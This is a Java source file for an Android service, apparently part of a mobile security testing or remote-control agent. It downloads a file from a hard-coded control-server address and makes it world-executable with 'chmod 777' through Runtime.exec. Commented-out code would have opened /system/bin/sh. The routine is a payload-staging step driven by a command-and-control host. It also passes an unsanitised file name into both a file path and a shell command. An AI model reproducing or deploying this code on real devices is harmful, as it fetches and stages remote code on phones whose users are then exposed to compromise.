package com.bulbsecurity.framework;

import jackpal.androidterm.Exec;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileDescriptor;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;



import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

public class Download extends Service {

	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}
	@Override
	public void onStart(Intent intent, int startID) {
		 Log.i("AAA", "started download");
		final String file = intent.getStringExtra("filename");
		String path = intent.getStringExtra("path");
		 String http = "http://";
			 String controlIP = getApplicationContext().getResources().getString(R.string.controlIP);
			String uri = http.concat(controlIP);
			String uri2 = uri.concat(path);
			final String pullfrom = uri2.concat(file);
		
		new Thread() {
			public void run() {
				 URL url;
				try {
					url = new URL(pullfrom);
				
		            URLConnection connection = url.openConnection();
 			    connection.connect();
		            int fileSize = connection.getContentLength();
		            BufferedInputStream input = new BufferedInputStream(connection.getInputStream());
		            Context ApplicationContext = getApplicationContext();
		            //String file2 = file.substring(1, file.length());
		           File file2 = new File(getApplicationContext().getFilesDir() + file);
		           String filestring = file2.toString();
		           Log.i("AAA", filestring);
		           FileOutputStream fos = new FileOutputStream(file2);
		            byte[] bytebuf = new byte[1024];
		           
		    		int read;
		    		while ((read = input.read(bytebuf, 0, bytebuf.length)) > 0) {
		    			fos.write(bytebuf, 0, read);
		    		}
		    		
		
		    		fos.flush();
		    		fos.close();
		    		input.close();
		    	//	int[] processId = new int[1];
		    		
		    	//	FileDescriptor fd = Exec.createSubprocess("/system/bin/sh", "-", null, processId);

		    	//	FileOutputStream out = new FileOutputStream(fd);
		    	//	FileInputStream in = new FileInputStream(fd);
		    		String command = "chmod 777 " + getFilesDir() + file  + "\n";
		    		Process process = Runtime.getRuntime().exec(command);
		    	//		out.write(command.getBytes());
		    	//		out.flush();
				} catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			};
		}.start();
}
}
